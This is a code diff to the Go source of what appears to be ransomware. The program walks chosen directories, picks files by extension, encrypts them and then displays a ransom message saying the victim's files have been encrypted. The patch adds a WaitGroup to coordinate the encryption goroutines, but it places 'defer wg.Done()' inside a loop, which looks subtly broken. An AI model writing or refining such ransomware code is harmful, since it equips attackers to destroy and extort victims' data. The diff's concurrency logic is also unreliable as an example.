@@ -8,6 +8,7 @@ import (
 	"net/url"
 	"os"
 	"path/filepath"
+	"sync"
 	"time"
 
 	"github.com/mauri870/cryptofile/crypto"
@@ -97,6 +98,8 @@ func encryptFiles() {
 
 	log.Println("Walking interesting dirs and indexing files...")
 
+	var wg sync.WaitGroup
+
 	// Loop over the interesting directories
 	go func() {
 		for _, f := range cmd.InterestingDirs {
@@ -107,6 +110,7 @@ func encryptFiles() {
 					// Matching extensions
 					if utils.StringInSlice(ext[1:], cmd.InterestingExtensions) {
 						file := cmd.File{FileInfo: f, Extension: ext[1:], Path: path}
+						wg.Add(1)
 						cmd.MatchedFiles <- file
 						log.Println("Matched:", path)
 					}
@@ -125,9 +129,9 @@ func encryptFiles() {
 				select {
 				case file, ok := <-cmd.MatchedFiles:
 					if !ok {
-						cmd.Done <- true
 						return
 					}
+					defer wg.Done()
 
 					log.Printf("Encrypting %s...\n", file.Path)
 
@@ -162,7 +166,8 @@ func encryptFiles() {
 		}()
 	}
 
-	<-cmd.Done
+	wg.Wait()
+
 	message := `
 	<pre>
 	YOUR FILES HAVE BEEN ENCRYPTED USING A STRONG
